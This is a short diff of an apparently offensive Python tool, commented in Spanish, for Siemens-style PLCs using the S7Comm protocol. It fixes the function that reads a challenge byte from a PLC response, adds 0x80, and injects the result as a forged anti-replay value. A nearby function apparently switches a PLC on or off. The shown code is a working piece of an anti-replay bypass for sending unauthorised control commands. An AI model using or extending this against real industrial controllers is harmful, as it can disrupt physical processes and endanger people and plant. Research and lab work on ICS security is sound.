@@ -208,14 +208,10 @@ def fCalcValorAntiReplay(pPayloadDeRespSolS7Comm):
   return vAntiReplay
 
 def fInyectarAntiReplayEnPayload(pPayload):
-  vPayloadAInyectar = bytearray(pPayload)
-  vChallenge = vPayloadAInyectar.hex()[48:50]       # Extraer el challenge
-  vAntiReplay = int(vChallenge, 16) + int("80", 16) # Calcular el valor del anti-replay
-  vAntiReplayHex = f"{vAntiReplay:02x}"             # Convertir el valor vAntiReplay en un string de 2 caracteres hex con relleno cero
-  # Preparar payload
-  vPayloadAInyectar = vPayloadAInyectar[:46] + hex(vAntiReplay)[2] + vPayloadAInyectar[47:]
-  vPayloadAInyectar = vPayloadAInyectar[:47] + hex(vAntiReplay)[3] + vPayloadAInyectar[48:]
-  print(f"vPayloadAInyectar")
+  vChallenge = pPayload[48:50]                                       # Extraer el challenge (1 byte = 2 caracteres hex, posición 24 en byte -> posición 48 en hex string)
+  vAntiReplay = int(vChallenge, 16) + 0x80                           # Calcular el valor anti-replay: challenge + 0x80
+  vAntiReplayHex = f"{vAntiReplay:02x}"                              # Convertir a string hexadecimal de 2 caracteres (relleno con 0 si hace falta)
+  vPayloadAInyectar = pPayload[:48] + vAntiReplayHex + pPayload[50:] # Reemplazar el byte 24 con el nuevo valor
   return vPayloadAInyectar
 
 def fEncApPLC(pHostPLC, pAction):
